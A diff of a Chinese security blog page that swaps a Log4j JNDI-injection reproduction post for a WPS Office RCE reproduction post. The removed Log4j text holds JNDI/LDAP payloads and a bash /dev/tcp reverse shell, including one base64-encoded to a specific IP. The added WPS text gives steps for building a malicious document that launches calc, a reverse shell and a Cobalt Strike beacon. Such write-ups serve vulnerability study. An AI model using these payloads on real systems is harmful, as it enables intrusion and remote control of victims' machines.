@@ -16,24 +16,24 @@
   <meta name="author" content="QY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.理解log4j漏洞的前置知识1.JNDI接口JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。 有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。 2.LDAP协议LDAP称为轻量级目录访问协议，既是">
+    <meta name="description" content="漏洞影响WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 漏洞复习本地复现 下载poc，需要python3.8以上的版本 12https:&#x2F;&#x2F;github.com&#x2F;b2git&#x2F;WPS-0DAY-20230809  执行以下命令安装依赖文件 12cd wps_rcepip install -r requirement.tx">
 <meta property="og:type" content="article">
-<meta property="og:title" content="log4j复现">
-<meta property="og:url" content="http://example.com/2023/03/12/log4j%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="WPS-rce-0day-漏洞复现">
+<meta property="og:url" content="http://example.com/2023/08/12/WPS-rce-0day-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="yaya-blog">
-<meta property="og:description" content="1.理解log4j漏洞的前置知识1.JNDI接口JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。 有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。 2.LDAP协议LDAP称为轻量级目录访问协议，既是">
+<meta property="og:description" content="漏洞影响WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 漏洞复习本地复现 下载poc，需要python3.8以上的版本 12https:&#x2F;&#x2F;github.com&#x2F;b2git&#x2F;WPS-0DAY-20230809  执行以下命令安装依赖文件 12cd wps_rcepip install -r requirement.tx">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122259262.jpg">
-<meta property="article:published_time" content="2023-03-12T12:07:09.000Z">
-<meta property="article:modified_time" content="2023-03-12T14:59:37.600Z">
+<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121010366.jpg">
+<meta property="article:published_time" content="2023-08-12T02:09:42.000Z">
+<meta property="article:modified_time" content="2023-08-12T07:18:15.924Z">
 <meta property="article:author" content="QY">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="-漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122259262.jpg">
+<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121010366.jpg">
   
   
   
-  <title>log4j复现 - yaya-blog</title>
+  <title>WPS-rce-0day-漏洞复现 - yaya-blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="log4j复现"></span>
+            <span id="subtitle" data-typed-text="WPS-rce-0day-漏洞复现"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-03-12 20:07" pubdate>
-          2023年3月12日 晚上
+        <time datetime="2023-08-12 10:09" pubdate>
+          2023年8月12日 上午
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          545 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          14 分钟
+          5 分钟
         
       </span>
     
@@ -271,50 +271,58 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">log4j复现</h1>
+            <h1 style="display: none">WPS-rce-0day-漏洞复现</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="1-理解log4j漏洞的前置知识"><a href="#1-理解log4j漏洞的前置知识" class="headerlink" title="1.理解log4j漏洞的前置知识"></a>1.理解log4j漏洞的前置知识</h3><h4 id="1-JNDI接口"><a href="#1-JNDI接口" class="headerlink" title="1.JNDI接口"></a>1.JNDI接口</h4><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
-<p><strong>有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</strong></p>
-<h4 id="2-LDAP协议"><a href="#2-LDAP协议" class="headerlink" title="2.LDAP协议"></a>2.LDAP协议</h4><p>LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。</p>
-<p><strong>有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</strong></p>
-<h4 id="3-RMI协议"><a href="#3-RMI协议" class="headerlink" title="3.RMI协议"></a>3.RMI协议</h4><p><strong>JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。</strong></p>
-<h4 id="4-Log4j"><a href="#4-Log4j" class="headerlink" title="4.Log4j"></a>4.Log4j</h4><p>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。</p>
-<h3 id="2-Log4j漏洞的成因"><a href="#2-Log4j漏洞的成因" class="headerlink" title="2.Log4j漏洞的成因"></a>2.Log4j漏洞的成因</h3><p>Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。</p>
-<p>由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。</p>
-<p>Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。</p>
-<p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE。</p>
-<h3 id="3-log4j漏洞复现"><a href="#3-log4j漏洞复现" class="headerlink" title="3.log4j漏洞复现"></a>3.log4j漏洞复现</h3><h4 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1.检测漏洞是否存在"></a>1.检测漏洞是否存在</h4><p>在线靶场 </p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf.show/challenges#Log<span class="hljs-number">4</span>j<span class="hljs-variable">%E5</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%E7</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%B0-1730</span><br></code></pre></td></tr></table></figure>
+                <h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085</p>
+<h3 id="漏洞复习"><a href="#漏洞复习" class="headerlink" title="漏洞复习"></a>漏洞复习</h3><p>本地复现</p>
+<p>下载poc，需要python3.8以上的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/b2git/WPS-0DAY-20230809<br><br></code></pre></td></tr></table></figure>
 
-<p>payload配合dnslog检测漏洞是否存在</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//ntoand.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure>
+<p>执行以下命令安装依赖文件</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cd wps_rce<br>pip install -r requirement<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122204654.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122205977.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<h4 id="2-进一步利用"><a href="#2-进一步利用" class="headerlink" title="2.进一步利用"></a>2.进一步利用</h4><p>在服务器上启动ladp服务</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122214917.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122221534.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>监听开启</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122223114.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>接下来进行payload构造</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldap:<span class="hljs-regexp">//</span>null:<span class="hljs-number">1389</span><span class="hljs-regexp">/Basic/</span>Command<span class="hljs-regexp">/Base64/</span>[base64_encoded_cmd]<br></code></pre></td></tr></table></figure>
+<p>在server文件夹下运行</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> main.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/yourip/</span><span class="hljs-number">1099</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121016091.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p>如</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$&#123;jndi:ldap://<span class="hljs-number">113.14</span>.<span class="hljs-number">5.159</span>:<span class="hljs-number">1389</span>/TomcatBypass/Command/Base<span class="hljs-number">64</span>/YmFzaCAtaSA<span class="hljs-variable">%2</span>bJiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">8</span>xMTMuMTQuNS<span class="hljs-number">4</span>xNTkvMjMzMyAwPiYxIA<span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d&#125;<br></code></pre></td></tr></table></figure>
+<p>访问url</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121017483.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p>YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMTMuMTQuNS4xNTkvMjMzMyAwPiYxIA%3d%3d</p>
-<h3 id="四、Log4j的临时缓解措施"><a href="#四、Log4j的临时缓解措施" class="headerlink" title="四、Log4j的临时缓解措施"></a>四、Log4j的临时缓解措施</h3><p>关闭lookup功能：</p>
-<p>（1）设置log4j2.formatMsgNoLookups&#x3D;True</p>
-<p>（2）Dlog4j2.formatMsgNoLookups&#x3D;true。</p>
-<p>（3）设置系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS为true</p>
-<p>（4）采用防火墙对请求流量中的${jndi进行拦截，防止JNDI注入。</p>
-<p>（5）禁止存在漏洞的业务访问外网，主动外连外网。</p>
+<p>在受害主机上添加host</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vpsip clientweb<span class="hljs-selector-class">.docer</span><span class="hljs-selector-class">.wps</span><span class="hljs-selector-class">.cn</span><span class="hljs-selector-class">.hackerwps</span>.cn<br></code></pre></td></tr></table></figure>
 
+
+
+<p>因此弹出计算器的payload为</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>clientweb.docer.wps.cn.hackerwps.cn/calc<br></code></pre></td></tr></table></figure>
+
+
+
+<p>进入client文件夹运行</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> test<span class="hljs-selector-class">.docx</span> https:<span class="hljs-comment">//clientweb.docer.wps.cn.hackerwps.cn/calc</span><br></code></pre></td></tr></table></figure>
+
+<p>test是要注入payload的文档</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121027483.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>生成带有命令的payload到目标主机上运行</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121459112.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>成功弹出计算器</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>生成文档</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121501859.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>开启监听</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121502817.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<h4 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h4><p>cs启动！</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121512430.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>开启监听</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121515570.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
+
+<p>生成恶意文档</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121518177.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
                 
               </div>
             
@@ -347,7 +355,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#-漏洞复现</a>
       
     </div>
   
@@ -359,8 +367,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>log4j复现</div>
-      <div>http://example.com/2023/03/12/log4j复现/</div>
+      <div>WPS-rce-0day-漏洞复现</div>
+      <div>http://example.com/2023/08/12/WPS-rce-0day-漏洞复现/</div>
     </div>
     <div class="license-meta">
       
@@ -372,7 +380,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年3月12日</div>
+          <div>2023年8月12日</div>
         </div>
       
       
@@ -404,18 +412,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/03/14/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网信息收集</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/03/11/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="sql注入笔记">
-                        <span class="hidden-mobile">sql注入笔记</span>
+                      <a href="/2023/08/11/burpsuite%E9%9D%B6%E5%9C%BAcsrf/" title="burpsuite靶场csrf">
+                        <span class="hidden-mobile">burpsuite靶场csrf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
